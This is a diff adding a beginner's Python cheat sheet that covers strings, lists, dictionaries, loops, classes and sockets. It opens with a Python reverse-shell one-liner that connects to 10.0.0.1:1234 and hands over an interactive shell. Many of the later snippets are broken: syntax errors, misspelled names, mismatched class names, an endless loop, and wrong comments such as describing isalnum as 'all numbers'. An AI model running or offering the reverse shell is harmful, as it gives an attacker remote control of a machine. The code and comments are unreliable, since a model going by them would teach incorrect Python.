@@ -1,0 +1,327 @@
+-=Reverse TCP Bash=-
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+-=Print=-
+print("hello world")
+
+-=Comment=-
+#Comment
+
+'''
+Multiline
+'''
+
+-=Variable=-
+name = "String"
+number = 10
+fNumber = 10.0
+
+-=Math=-
+5 ** 2 = 25 #exponit
+5 % 2 = 1 #remainder
+5 // 2 = 2 #floor
+
+-=String=-
+test = "\"Always remember to escape"
+
+multiLineQuote = '''
+test 123
+'''
+
+print("%s %s %s" % (variable1, variable2, variable3))
+
+print("no new line", end="")
+
+longString = "I'll catch you if you fall - The Floor"
+print(longString[0:4]) #I'll
+print(longString[-5:]) # Floor
+print(longString[:-5]) #I'll catch you if you fall
+print("%c is my %s letter and my number %d number is %.5f" % ('x','favorit', 1, 0.14))
+print(longString.capitalize()) #Caps first leter
+print(longString.find("Floor")) #33
+print(longString.isalpha()) #all leters
+print(longString.isalnum()) #all numbers
+print(longString.replace("Floor", "Ground")) #replace
+print(longString.strip()) #takes away white space
+stringList = longString.split(" ") #takes every word and puts into a list
+
+-=Lists=-
+groceryList = ['bread', 'grapes', 'milk']
+print("First Item is: ", groceryList[0])
+
+groceryList[0] = "New Value"
+
+groceryList.append('appended value')
+
+groceryList.insert(1, 'Inserted value')
+
+groceryList.sort() #Sorts alpabedecaly
+
+groceryList.remove("Value")
+
+groceryList.reverse() # Sorts anti alpabedecaly
+
+del groceryList[2] #del a file
+
+list3 = list1 + list2 #add two lists togeather
+
+
+-=Tuple=-
+piTuple = (1,2,3,4,5) #can not be changed
+
+newTuple = list(piTuple) #turn a tuple into a list
+
+
+-=Dictonary=-
+superVillains = {'key' : 'value', 'key2' : 'value2'}
+
+print(superVillains['key']) #prints value
+
+del superVillains['key'] 
+
+superVillins['key'] = 'newValue'
+
+len(superVillians) #prints how many 
+
+superVillains.get("key") #prints value
+
+superVillains.keys() #prints all keys
+
+superVillains.values() #prints conditions values
+
+
+-=Conditions=-
+age = 21
+if age > 16 :
+	print("you are old")
+elif age >=16:
+	print("you you can drive a car")
+else:
+	print("you are yong")
+
+
+if ((age >= 1)) and (age <= 18)):
+	print("Do a thing")
+elif (age == 21) or (age >=65):
+	print("Do a thing")
+elif not(age == 30):
+	print("Do a thing")
+
+
+-=Looping=-
+for x in range(0, 10):
+	print(x, ' ', end="")
+
+list = [1,2,3]
+for x in list:
+	print(x)
+
+flag = True
+while(flag):
+	print("loop")
+
+x = 0
+while(x <= 20):
+	if(x%2 == 0):	
+		print("loop")
+	elif(i==9):
+		break #Breaks out of loop
+	else:
+		x += 1
+		continue #starts back at the top of the loop again
+	x += 1
+
+import random
+randomNum = random.randrange(0,100)
+while(randomNum != 15):
+	print(randomNum)
+	randomNum = random.randrange(0,100) #new random number
+
+
+-=Function=-
+def functionName(variable1, variable2):
+	sum = vuriable1 + variable2
+	return sum
+
+print(functionName(1,2))
+
+-=input=-
+import sys
+name = sys.stdin.readline()
+print('Hello', name)
+
+name = input("prompt")
+
+name = raw_input("prompt")
+
+
+-=File IO=-
+file = open("test.txt", "wb") #write
+print(file.mode) #prints mode
+print(file.name) #prints name
+file.write(bytes("Write me to the file\n", 'UTF-8'))
+file.close()
+
+file = open("test.txt", "r+") #reading and writing
+text = file.read()
+print(text)
+
+import os
+os.remove("test.txt") #Del file
+
+
+-=Objects=-
+class animal:
+	__name = None #no value, __ makes the variable private
+	__height = 0
+	__weight = 0
+	__sound = 0
+
+	def __init__(self, name, height, weight, sound): #constructor
+		self.__name = name
+		self.__height = height
+		self.__weight = weight
+		self.__sound = sound
+
+	def setName(self, name):
+		self.__name = name
+
+	def getName(self):
+		return self.__name
+
+	def setHeight(self, height):
+		self.__height = height
+
+	def getHeight(self):
+		return self.__height
+
+	def setWeight(self, weight):
+		self.__weight = weight
+
+	def getWeight(self):
+		return self.__weight
+
+	def setSound(self, sound):
+		self.__sound = sound
+
+	def getSound(self):
+		return self.__sound
+
+	def getType(self):
+		print("Animal")
+
+	def toString(self):
+		return "{} is {} cm tall and {} Kilo and say{}".format(self.__name,self.__height,self.__weight,self.__sound)
+
+
+cat = Animal('wiskers', 33, 10, 'Bark')
+print(cat.toString())
+
+
+-=Inharitance=- 
+#takes all the variables and functions from another class and adds to it
+class Dog(Animal):
+	__owner = ""
+
+	def __init__(self, name, height, weight, sound, owner): #Overite
+		self.__owner = owner
+		super(Dog, self).__init__(name, height, weight, sound) #super class so name++ get handled
+
+	def setOwner(self, owner):
+		self.__owner = owner
+
+	def getOwner(self):
+		return self.__owner
+
+	def getType(self):
+		print("Dog")
+
+	def toString(self)
+		return "{} is {} cm tall and {} Kilo and say{} and owner {}".format(self.__name,self.__height,self.__weight,self.__sound,self.__owner)
+
+	def multipleSounds(self, howMany=None): #Method Overloading
+		if howMany is None:
+			print(self.getSound())
+		else:
+			print(self.getSound() * howMany)
+
+spot = Dog("spot", 54, 23, "ruff", "jake")
+print(spot.toString())
+
+-=Polimorphism=- #Class seption
+class animalTesting:
+	def getType(self, animal)
+		animal.getType()
+
+testAnimals = animalTesting()
+testAnimals.getType(cat)
+testAnimals.getType(dog)
+
+
+-=Socket=-
+-Client
+# create an INET, STREAMing socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+# now connect to the web server on port 80 - the normal http port
+s.connect(("www.python.org", 80))
+
+-Server
+# create an INET, STREAMing socket
+serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+# bind the socket to a public host, and a well-known port
+serversocket.bind((socket.gethostname(), 80))
+# become a server socket
+serversocket.listen(5)
+
+while True:
+    # accept connections from outside
+    (clientsocket, address) = serversocket.accept()
+    # now do something with the clientsocket
+    # in this case, we'll pretend this is a threaded server
+    ct = client_thread(clientsocket)
+    ct.run()
+
+class MySocket:
+    """demonstration class only
+      - coded for clarity, not efficiency
+    """
+
+    def __init__(self, sock=None):
+        if sock is None:
+            self.sock = socket.socket(
+                            socket.AF_INET, socket.SOCK_STREAM)
+        else:
+            self.sock = sock
+
+    def connect(self, host, port):
+        self.sock.connect((host, port))
+
+    def mysend(self, msg):
+        totalsent = 0
+        while totalsent < MSGLEN:
+            sent = self.sock.send(msg[totalsent:])
+            if sent == 0:
+                raise RuntimeError("socket connection broken")
+            totalsent = totalsent + sent
+
+    def myreceive(self):
+        chunks = []
+        bytes_recd = 0
+        while bytes_recd < MSGLEN:
+            chunk = self.sock.recv(min(MSGLEN - bytes_recd, 2048))
+            if chunk == b'':
+                raise RuntimeError("socket connection broken")
+            chunks.append(chunk)
+            bytes_recd = bytes_recd + len(chunk)
+        return b''.join(chunks)
+
+
+
+
+
+
+
+
+
+
+
